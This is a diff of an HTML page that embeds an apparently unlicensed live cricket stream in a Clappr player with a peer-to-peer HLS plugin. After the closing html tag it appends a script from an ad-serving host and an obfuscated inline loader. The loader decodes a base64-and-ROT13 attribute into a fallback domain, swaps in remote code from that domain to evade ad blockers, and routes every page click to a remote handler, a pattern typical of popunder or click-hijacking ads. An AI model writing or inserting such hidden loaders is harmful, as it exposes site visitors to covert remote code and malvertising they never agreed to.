@@ -1,24 +1,54 @@
-
 <html>
-  <head>
-    <title>Sky Cricket Live | BotolBaba</title>
-      <style>
-          html, body {margin:0;padding:0;height:100%;}
-      </style>
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-XTLM3ZLGNS"></script>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cricfree Live Player</title>
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/cdnbye@latest/dist/hlsjs-p2p-engine.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/cdnbye@latest/dist/clappr-plugin.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clappr-responsive-container-plugin@1.0.0/dist/clappr-responsive-container-plugin.min.js"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/clappr/clappr-level-selector-plugin@latest/dist/level-selector.min.js"></script>
+</head>
+<div id="player"></div>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    var player = new Clappr.Player(
+        {
+            source: "https://cdn.cricplay.xyz/hls/2.m3u8",
+            parentId: "#player",
+            autoPlay: false,
+  		mute: true,
+		width: '100%',
+		height:'99.9%',
+            plugins: [CDNByeClapprPlugin, LevelSelector],
+            levelSelectorConfig: {
+                title: 'Quality',
+                labels: {
+                    1: 'High-720p', // 240kbps
+                    0: 'Low-360p', // 120kbps
+                }
+              },
+            playback: {
+                hlsjsConfig: {
+                    // Other hlsjsConfig options provided by hls.js
+                    p2pConfig: {
+                        logLevel: 'debug',
+                        live: true,        // set to true in live mode
+                        // Other p2pConfig options provided by CDNBye
+                    }
+                }
+            },
+                    mediacontrol: {
+                        seekbar: '#ff0000',
+                        buttons: '#58bcaf'
+                    },
+        });
 
-  gtag('config', 'G-XTLM3ZLGNS');
 </script>
-  </head>
-  <body>
-
-<iframe src="https://stream.crichd.vip/update/skys1.php" width="650" height="510" frameborder="0" allowfullscreen></iframe>
-
-  </body>
 </html>
-  
+
+
+<script type="text/javascript" src="//cdnondemand.org/script/su.js" zid="5102671" admn="Y3ZjeXJjX3Bieg==" admc="Zm55bGFwX3Bieg==" did="aenRm"></script><script type="text/javascript">
+(function() {setTimeout(function(){if(!window["s2ss1021"]){let e=document.querySelector('script[did="aenRm"]'),t=!!e.hasAttribute("admc")&&function(e){let t=atob(e).replace(/[a-zA-Z]/g,function(e){var t=e<="Z"?65:97;return String.fromCharCode(t+(e.charCodeAt(0)-t+13)%26)});return t.replaceAll("_",".")}(e.getAttribute("admc")),r=e.getAttribute("src"),a=e.parentElement,c=document.createElement("script");!function(e,t){let r,a=["did","admc","src"],c=Array.prototype.slice.call(t.attributes);for(;r=c.pop();)-1===a.indexOf(r.nodeName)&&e.setAttribute(r.nodeName,r.nodeValue)}(c,e),c.src=(d=r,"//"+t+d.replace(/^.*\/\/[^\/]+/,"")),c.setAttribute("sadbl",1),a.removeChild(e),a.appendChild(c)}var d},150);document.body.addEventListener("click",function(e){window["s2ss1021ff"]instanceof Function&&window["s2ss1021ff"](e)});})();
+</script>
